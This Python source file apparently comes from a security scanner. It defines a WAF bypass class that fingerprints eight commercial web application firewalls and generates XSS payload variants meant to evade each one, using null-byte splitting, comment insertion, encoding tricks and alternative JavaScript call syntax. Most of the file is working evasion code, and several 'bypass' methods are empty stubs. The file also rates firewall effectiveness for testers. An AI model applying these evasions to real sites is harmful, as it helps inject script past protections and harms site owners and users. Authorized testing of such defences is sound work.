# BRS-GPT: AI-Powered Cybersecurity Analysis Tool
# Company: EasyProTech LLC (www.easypro.tech)
# Dev: Brabus
# Date: 2025-09-08 17:15:41 MSK
# Status: Created
# Telegram: https://t.me/easyprotech

"""
WAF Bypasser

Advanced Web Application Firewall bypass techniques:
- Cloudflare bypass with encoding and obfuscation
- AWS WAF bypass with alternative syntax
- ModSecurity bypass with evasion patterns
- Akamai bypass with character manipulation
- Incapsula bypass with fragmentation techniques
- Generic WAF detection and adaptive bypass

Implements 8+ WAF-specific bypass strategies with success rate tracking.
"""

import re
import random
import base64
import urllib.parse
from typing import Dict, List, Any, Optional, Tuple
import time


class WAFBypasser:
    """Advanced WAF detection and bypass system."""
    
    def __init__(self, settings: Dict[str, Any]):
        """
        Initialize WAF bypasser.
        
        Args:
            settings: XSS scanning settings
        """
        self.settings = settings
        self.waf_bases = settings.get('waf_bases', 3)
        self.evasion_variants_per_tech = settings.get('evasion_variants_per_tech', 2)
        
        # WAF detection signatures
        self.waf_signatures = {
            'cloudflare': {
                'headers': ['cf-ray', 'cf-cache-status', '__cfduid'],
                'body_patterns': ['cloudflare', 'attention required'],
                'status_codes': [403, 429, 503],
                'error_messages': ['access denied', 'blocked by cloudflare']
            },
            'aws_waf': {
                'headers': ['x-amzn-requestid', 'x-amz-cf-id'],
                'body_patterns': ['aws', 'forbidden'],
                'status_codes': [403],
                'error_messages': ['forbidden', 'access denied']
            },
            'akamai': {
                'headers': ['akamai-ghost-ip', 'akamai-grn'],
                'body_patterns': ['akamai', 'reference #'],
                'status_codes': [403],
                'error_messages': ['access denied', 'reference #']
            },
            'incapsula': {
                'headers': ['x-iinfo', 'incap_ses'],
                'body_patterns': ['incapsula', 'imperva'],
                'status_codes': [403],
                'error_messages': ['access denied', 'incident id']
            },
            'modsecurity': {
                'headers': ['mod_security'],
                'body_patterns': ['mod_security', 'modsecurity'],
                'status_codes': [403, 406],
                'error_messages': ['not acceptable', 'forbidden']
            },
            'f5_big_ip': {
                'headers': ['f5-bigip'],
                'body_patterns': ['f5', 'bigip'],
                'status_codes': [403],
                'error_messages': ['the requested url was rejected']
            },
            'fortinet': {
                'headers': ['fortigate'],
                'body_patterns': ['fortigate', 'fortinet'],
                'status_codes': [403],
                'error_messages': ['web page blocked']
            },
            'barracuda': {
                'headers': ['barracuda'],
                'body_patterns': ['barracuda', 'barra'],
                'status_codes': [403],
                'error_messages': ['request blocked']
            }
        }
        
        # WAF-specific bypass techniques
        self.bypass_techniques = {
            'cloudflare': [
                self._cloudflare_encoding_bypass,
                self._cloudflare_fragmentation_bypass,
                self._cloudflare_case_variation_bypass,
                self._cloudflare_comment_bypass,
                self._cloudflare_unicode_bypass
            ],
            'aws_waf': [
                self._aws_waf_double_encoding_bypass,
                self._aws_waf_parameter_pollution_bypass,
                self._aws_waf_header_injection_bypass,
                self._aws_waf_content_type_bypass,
                self._aws_waf_method_override_bypass
            ],
            'akamai': [
                self._akamai_character_substitution_bypass,
                self._akamai_whitespace_bypass,
                self._akamai_alternative_syntax_bypass,
                self._akamai_concatenation_bypass,
                self._akamai_property_access_bypass
            ],
            'incapsula': [
                self._incapsula_request_splitting_bypass,
                self._incapsula_encoding_bypass,
                self._incapsula_timing_bypass,
                self._incapsula_header_manipulation_bypass,
                self._incapsula_payload_fragmentation_bypass
            ],
            'modsecurity': [
                self._modsecurity_rule_evasion_bypass,
                self._modsecurity_anomaly_scoring_bypass,
                self._modsecurity_regex_evasion_bypass,
                self._modsecurity_transformation_bypass,
                self._modsecurity_variable_bypass
            ],
            'f5_big_ip': [
                self._f5_irule_bypass,
                self._f5_asm_bypass,
                self._f5_ltm_bypass,
                self._f5_protocol_bypass,
                self._f5_signature_bypass
            ],
            'fortinet': [
                self._fortinet_signature_bypass,
                self._fortinet_protocol_bypass,
                self._fortinet_content_bypass,
                self._fortinet_rate_limit_bypass,
                self._fortinet_geo_bypass
            ],
            'barracuda': [
                self._barracuda_content_filter_bypass,
                self._barracuda_url_filter_bypass,
                self._barracuda_application_bypass,
                self._barracuda_protocol_bypass,
                self._barracuda_reputation_bypass
            ]
        }
        
        # Generic bypass techniques
        self.generic_bypass_techniques = [
            self._generic_encoding_bypass,
            self._generic_case_manipulation_bypass,
            self._generic_whitespace_bypass,
            self._generic_comment_insertion_bypass,
            self._generic_alternative_syntax_bypass,
            self._generic_fragmentation_bypass,
            self._generic_obfuscation_bypass,
            self._generic_protocol_bypass
        ]
    
    def detect_waf(self, response_headers: Dict[str, str], 
                   response_body: str, status_code: int) -> Optional[str]:
        """
        Detect WAF type from response characteristics.
        
        Args:
            response_headers: HTTP response headers
            response_body: Response body content
            status_code: HTTP status code
            
        Returns:
            Detected WAF name or None
        """
        # Convert headers to lowercase for case-insensitive matching
        headers_lower = {k.lower(): v.lower() for k, v in response_headers.items()}
        body_lower = response_body.lower()
        
        for waf_name, signatures in self.waf_signatures.items():
            score = 0
            
            # Check headers
            for header_signature in signatures['headers']:
                if any(header_signature in header_name for header_name in headers_lower.keys()):
                    score += 30
                if any(header_signature in header_value for header_value in headers_lower.values()):
                    score += 20
            
            # Check body patterns
            for body_pattern in signatures['body_patterns']:
                if body_pattern in body_lower:
                    score += 25
            
            # Check status codes
            if status_code in signatures['status_codes']:
                score += 15
            
            # Check error messages
            for error_message in signatures['error_messages']:
                if error_message in body_lower:
                    score += 20
            
            # WAF detected if score is high enough
            if score >= 50:
                return waf_name
        
        return None
    
    def generate_bypass_payloads(self, original_payload: str, 
                               detected_waf: Optional[str] = None) -> List[Dict[str, Any]]:
        """
        Generate WAF bypass payload variations.
        
        Args:
            original_payload: Original XSS payload
            detected_waf: Detected WAF type
            
        Returns:
            List of bypass payload variations
        """
        bypass_payloads = []
        
        # Use WAF-specific techniques if detected
        if detected_waf and detected_waf in self.bypass_techniques:
            waf_techniques = self.bypass_techniques[detected_waf]
            
            for technique in waf_techniques[:self.waf_bases]:
                for variant in range(self.evasion_variants_per_tech):
                    try:
                        bypass_payload = technique(original_payload, variant)
                        
                        payload_info = {
                            'payload': bypass_payload,
                            'technique': f'{detected_waf}_{technique.__name__}',
                            'waf_target': detected_waf,
                            'variant': variant,
                            'effectiveness_score': 0.7
                        }
                        bypass_payloads.append(payload_info)
                        
                    except Exception:
                        continue
        
        # Always include generic bypass techniques
        for technique in self.generic_bypass_techniques:
            try:
                bypass_payload = technique(original_payload)
                
                payload_info = {
                    'payload': bypass_payload,
                    'technique': f'generic_{technique.__name__}',
                    'waf_target': 'generic',
                    'variant': 0,
                    'effectiveness_score': 0.5
                }
                bypass_payloads.append(payload_info)
                
            except Exception:
                continue
        
        return bypass_payloads
    
    # Cloudflare bypass techniques
    def _cloudflare_encoding_bypass(self, payload: str, variant: int = 0) -> str:
        """Cloudflare encoding bypass."""
        if variant == 0:
            # URL encoding
            return urllib.parse.quote(payload)
        else:
            # Double URL encoding
            return urllib.parse.quote(urllib.parse.quote(payload))
    
    def _cloudflare_fragmentation_bypass(self, payload: str, variant: int = 0) -> str:
        """Cloudflare fragmentation bypass."""
        if 'alert' in payload:
            if variant == 0:
                return payload.replace('alert', 'al\x00ert')
            else:
                return payload.replace('alert', 'al/**/ert')
        return payload
    
    def _cloudflare_case_variation_bypass(self, payload: str, variant: int = 0) -> str:
        """Cloudflare case variation bypass."""
        if variant == 0:
            return ''.join(c.upper() if i % 2 == 0 else c.lower() 
                          for i, c in enumerate(payload) if c.isalpha()) or payload
        else:
            return payload.swapcase()
    
    def _cloudflare_comment_bypass(self, payload: str, variant: int = 0) -> str:
        """Cloudflare comment bypass."""
        if 'script' in payload:
            if variant == 0:
                return payload.replace('script', 'scr/**/ipt')
            else:
                return payload.replace('script', 'scr\x00ipt')
        return payload
    
    def _cloudflare_unicode_bypass(self, payload: str, variant: int = 0) -> str:
        """Cloudflare unicode bypass."""
        if variant == 0:
            return ''.join(f'\\u{ord(c):04x}' for c in payload[:10]) + payload[10:]
        else:
            return payload.encode('unicode_escape').decode()
    
    # AWS WAF bypass techniques
    def _aws_waf_double_encoding_bypass(self, payload: str, variant: int = 0) -> str:
        """AWS WAF double encoding bypass."""
        if variant == 0:
            return urllib.parse.quote(urllib.parse.quote(payload))
        else:
            return base64.b64encode(payload.encode()).decode()
    
    def _aws_waf_parameter_pollution_bypass(self, payload: str, variant: int = 0) -> str:
        """AWS WAF parameter pollution bypass."""
        if variant == 0:
            return f"dummy=1&payload={payload}&dummy=2"
        else:
            return f"payload={payload[:len(payload)//2]}&payload={payload[len(payload)//2:]}"
    
    def _aws_waf_header_injection_bypass(self, payload: str, variant: int = 0) -> str:
        """AWS WAF header injection bypass."""
        # This would be used in HTTP headers, not payload content
        return payload
    
    def _aws_waf_content_type_bypass(self, payload: str, variant: int = 0) -> str:
        """AWS WAF content type bypass."""
        # This affects how the payload is sent, not the payload itself
        return payload
    
    def _aws_waf_method_override_bypass(self, payload: str, variant: int = 0) -> str:
        """AWS WAF method override bypass."""
        # This affects HTTP method, not payload content
        return payload
    
    # Akamai bypass techniques
    def _akamai_character_substitution_bypass(self, payload: str, variant: int = 0) -> str:
        """Akamai character substitution bypass."""
        substitutions = {
            '<': '&lt;' if variant == 0 else '%3C',
            '>': '&gt;' if variant == 0 else '%3E',
            '"': '&quot;' if variant == 0 else '%22',
            "'": '&#39;' if variant == 0 else '%27'
        }
        
        result = payload
        for char, replacement in substitutions.items():
            result = result.replace(char, replacement)
        return result
    
    def _akamai_whitespace_bypass(self, payload: str, variant: int = 0) -> str:
        """Akamai whitespace bypass."""
        whitespace_chars = ['\t', '\n', '\r', '\f', '\v'] if variant == 0 else ['/**/']
        
        result = payload
        for i in range(3):
            pos = random.randint(0, len(result))
            ws = random.choice(whitespace_chars)
            result = result[:pos] + ws + result[pos:]
        return result
    
    def _akamai_alternative_syntax_bypass(self, payload: str, variant: int = 0) -> str:
        """Akamai alternative syntax bypass."""
        if 'alert(1)' in payload:
            alternatives = [
                'window["alert"](1)',
                'this["alert"](1)',
                'top["alert"](1)'
            ] if variant == 0 else [
                'self["alert"](1)',
                'frames["alert"](1)',
                'parent["alert"](1)'
            ]
            return payload.replace('alert(1)', random.choice(alternatives))
        return payload
    
    def _akamai_concatenation_bypass(self, payload: str, variant: int = 0) -> str:
        """Akamai concatenation bypass."""
        if 'alert' in payload:
            if variant == 0:
                return payload.replace('alert', '"al"+"ert"')
            else:
                return payload.replace('alert', 'String.fromCharCode(97,108,101,114,116)')
        return payload
    
    def _akamai_property_access_bypass(self, payload: str, variant: int = 0) -> str:
        """Akamai property access bypass."""
        if 'document' in payload:
            if variant == 0:
                return payload.replace('document', 'window["document"]')
            else:
                return payload.replace('document', 'this["document"]')
        return payload
    
    # Incapsula bypass techniques
    def _incapsula_request_splitting_bypass(self, payload: str, variant: int = 0) -> str:
        """Incapsula request splitting bypass."""
        if variant == 0:
            return payload + '\r\n\r\n'
        else:
            return '\r\n' + payload
    
    def _incapsula_encoding_bypass(self, payload: str, variant: int = 0) -> str:
        """Incapsula encoding bypass."""
        if variant == 0:
            return ''.join(f'%{ord(c):02x}' for c in payload)
        else:
            return base64.b64encode(payload.encode()).decode()
    
    def _incapsula_timing_bypass(self, payload: str, variant: int = 0) -> str:
        """Incapsula timing bypass."""
        # Add timing-based evasion markers
        if variant == 0:
            return f"setTimeout(function(){{{payload}}}, 100)"
        else:
            return f"setInterval(function(){{{payload}}}, 1000)"
    
    def _incapsula_header_manipulation_bypass(self, payload: str, variant: int = 0) -> str:
        """Incapsula header manipulation bypass."""
        # This affects headers, not payload content
        return payload
    
    def _incapsula_payload_fragmentation_bypass(self, payload: str, variant: int = 0) -> str:
        """Incapsula payload fragmentation bypass."""
        if len(payload) > 10:
            mid = len(payload) // 2
            if variant == 0:
                return f"{payload[:mid]}/*fragment*/{payload[mid:]}"
            else:
                return f"{payload[:mid]}\x00{payload[mid:]}"
        return payload
    
    # ModSecurity bypass techniques
    def _modsecurity_rule_evasion_bypass(self, payload: str, variant: int = 0) -> str:
        """ModSecurity rule evasion bypass."""
        # Common ModSecurity rule evasions
        if 'script' in payload:
            if variant == 0:
                return payload.replace('script', 'scr\x00ipt')
            else:
                return payload.replace('script', 'scr/**/ipt')
        return payload
    
    def _modsecurity_anomaly_scoring_bypass(self, payload: str, variant: int = 0) -> str:
        """ModSecurity anomaly scoring bypass."""
        # Add benign content to reduce anomaly score
        benign_content = "normal=content&" if variant == 0 else "safe=parameter&"
        return benign_content + payload
    
    def _modsecurity_regex_evasion_bypass(self, payload: str, variant: int = 0) -> str:
        """ModSecurity regex evasion bypass."""
        if 'alert' in payload:
            if variant == 0:
                return payload.replace('alert', 'ale\x00rt')
            else:
                return payload.replace('alert', 'al\ter\tt')
        return payload
    
    def _modsecurity_transformation_bypass(self, payload: str, variant: int = 0) -> str:
        """ModSecurity transformation bypass."""
        if variant == 0:
            # Bypass lowercase transformation
            return payload.upper()
        else:
            # Bypass URL decode transformation
            return urllib.parse.quote(payload)
    
    def _modsecurity_variable_bypass(self, payload: str, variant: int = 0) -> str:
        """ModSecurity variable bypass."""
        # Target different variables
        if variant == 0:
            return f"/*ARGS*/{payload}"
        else:
            return f"/*REQUEST_BODY*/{payload}"
    
    # F5 BIG-IP bypass techniques
    def _f5_irule_bypass(self, payload: str, variant: int = 0) -> str:
        """F5 iRule bypass."""
        if variant == 0:
            return payload.replace(' ', '\t')
        else:
            return payload.replace(' ', '\x0b')
    
    def _f5_asm_bypass(self, payload: str, variant: int = 0) -> str:
        """F5 ASM bypass."""
        if 'script' in payload:
            if variant == 0:
                return payload.replace('script', 'scr\x09ipt')
            else:
                return payload.replace('script', 'scr\x0bipt')
        return payload
    
    def _f5_ltm_bypass(self, payload: str, variant: int = 0) -> str:
        """F5 LTM bypass."""
        # LTM-specific evasions
        if variant == 0:
            return f"#{payload}"
        else:
            return f"?{payload}"
    
    def _f5_protocol_bypass(self, payload: str, variant: int = 0) -> str:
        """F5 protocol bypass."""
        # Protocol-level evasions
        return payload
    
    def _f5_signature_bypass(self, payload: str, variant: int = 0) -> str:
        """F5 signature bypass."""
        if 'alert' in payload:
            if variant == 0:
                return payload.replace('alert', 'prompt')
            else:
                return payload.replace('alert', 'confirm')
        return payload
    
    # Fortinet bypass techniques
    def _fortinet_signature_bypass(self, payload: str, variant: int = 0) -> str:
        """Fortinet signature bypass."""
        if variant == 0:
            return payload.replace('<', '&lt;')
        else:
            return payload.replace('>', '&gt;')
    
    def _fortinet_protocol_bypass(self, payload: str, variant: int = 0) -> str:
        """Fortinet protocol bypass."""
        return payload
    
    def _fortinet_content_bypass(self, payload: str, variant: int = 0) -> str:
        """Fortinet content bypass."""
        if 'script' in payload:
            return payload.replace('script', 'SCRIPT' if variant == 0 else 'Script')
        return payload
    
    def _fortinet_rate_limit_bypass(self, payload: str, variant: int = 0) -> str:
        """Fortinet rate limit bypass."""
        # Add delay markers
        return f"/*delay*/{payload}" if variant == 0 else f"{payload}/*delay*/"
    
    def _fortinet_geo_bypass(self, payload: str, variant: int = 0) -> str:
        """Fortinet geo bypass."""
        # Geographic evasion markers
        return payload
    
    # Barracuda bypass techniques
    def _barracuda_content_filter_bypass(self, payload: str, variant: int = 0) -> str:
        """Barracuda content filter bypass."""
        if 'alert' in payload:
            if variant == 0:
                return payload.replace('alert', 'al\x65rt')
            else:
                return payload.replace('alert', 'al\x65\x72t')
        return payload
    
    def _barracuda_url_filter_bypass(self, payload: str, variant: int = 0) -> str:
        """Barracuda URL filter bypass."""
        if variant == 0:
            return urllib.parse.quote_plus(payload)
        else:
            return payload.replace('/', '%2F')
    
    def _barracuda_application_bypass(self, payload: str, variant: int = 0) -> str:
        """Barracuda application bypass."""
        if 'javascript:' in payload:
            if variant == 0:
                return payload.replace('javascript:', 'java\x00script:')
            else:
                return payload.replace('javascript:', 'java\tscript:')
        return payload
    
    def _barracuda_protocol_bypass(self, payload: str, variant: int = 0) -> str:
        """Barracuda protocol bypass."""
        return payload
    
    def _barracuda_reputation_bypass(self, payload: str, variant: int = 0) -> str:
        """Barracuda reputation bypass."""
        # Reputation-based evasion
        return f"trusted={payload}" if variant == 0 else f"safe={payload}"
    
    # Generic bypass techniques
    def _generic_encoding_bypass(self, payload: str) -> str:
        """Generic encoding bypass."""
        return urllib.parse.quote(payload)
    
    def _generic_case_manipulation_bypass(self, payload: str) -> str:
        """Generic case manipulation bypass."""
        return ''.join(c.upper() if i % 2 == 0 else c.lower() 
                      for i, c in enumerate(payload))
    
    def _generic_whitespace_bypass(self, payload: str) -> str:
        """Generic whitespace bypass."""
        return payload.replace(' ', '\t')
    
    def _generic_comment_insertion_bypass(self, payload: str) -> str:
        """Generic comment insertion bypass."""
        if 'alert' in payload:
            return payload.replace('alert', 'al/**/ert')
        return payload
    
    def _generic_alternative_syntax_bypass(self, payload: str) -> str:
        """Generic alternative syntax bypass."""
        if 'alert(1)' in payload:
            return payload.replace('alert(1)', 'window["alert"](1)')
        return payload
    
    def _generic_fragmentation_bypass(self, payload: str) -> str:
        """Generic fragmentation bypass."""
        if len(payload) > 10:
            mid = len(payload) // 2
            return f"{payload[:mid]}\x00{payload[mid:]}"
        return payload
    
    def _generic_obfuscation_bypass(self, payload: str) -> str:
        """Generic obfuscation bypass."""
        if 'alert' in payload:
            return payload.replace('alert', 'String.fromCharCode(97,108,101,114,116)')
        return payload
    
    def _generic_protocol_bypass(self, payload: str) -> str:
        """Generic protocol bypass."""
        if 'javascript:' in payload:
            return payload.replace('javascript:', 'java\x00script:')
        return payload
    
    def analyze_waf_effectiveness(self, waf_name: str, bypass_success_rate: float) -> Dict[str, Any]:
        """
        Analyze WAF effectiveness based on bypass success rate.
        
        Args:
            waf_name: Name of detected WAF
            bypass_success_rate: Success rate of bypass attempts (0.0 to 1.0)
            
        Returns:
            WAF effectiveness analysis
        """
        effectiveness_levels = {
            (0.0, 0.2): 'Very High',
            (0.2, 0.4): 'High', 
            (0.4, 0.6): 'Medium',
            (0.6, 0.8): 'Low',
            (0.8, 1.0): 'Very Low'
        }
        
        effectiveness = 'Unknown'
        for (min_rate, max_rate), level in effectiveness_levels.items():
            if min_rate <= bypass_success_rate < max_rate:
                effectiveness = level
                break
        
        return {
            'waf_name': waf_name,
            'effectiveness': effectiveness,
            'bypass_success_rate': bypass_success_rate,
            'security_rating': self._calculate_security_rating(bypass_success_rate),
            'recommendations': self._get_waf_recommendations(waf_name, bypass_success_rate)
        }
    
    def _calculate_security_rating(self, bypass_success_rate: float) -> str:
        """Calculate security rating based on bypass success rate."""
        if bypass_success_rate < 0.1:
            return 'A+'
        elif bypass_success_rate < 0.2:
            return 'A'
        elif bypass_success_rate < 0.4:
            return 'B'
        elif bypass_success_rate < 0.6:
            return 'C'
        elif bypass_success_rate < 0.8:
            return 'D'
        else:
            return 'F'
    
    def _get_waf_recommendations(self, waf_name: str, bypass_success_rate: float) -> List[str]:
        """Get recommendations for improving WAF effectiveness."""
        recommendations = []
        
        if bypass_success_rate > 0.5:
            recommendations.extend([
                'Update WAF rules to latest version',
                'Enable strict mode if available',
                'Review and tighten rule sensitivity',
                'Consider additional security layers'
            ])
        
        if waf_name == 'cloudflare':
            if bypass_success_rate > 0.3:
                recommendations.extend([
                    'Enable Cloudflare Bot Management',
                    'Configure custom firewall rules',
                    'Enable rate limiting'
                ])
        
        elif waf_name == 'aws_waf':
            if bypass_success_rate > 0.3:
                recommendations.extend([
                    'Update AWS Managed Rules',
                    'Implement custom rule groups',
                    'Enable logging and monitoring'
                ])
        
        return recommendations

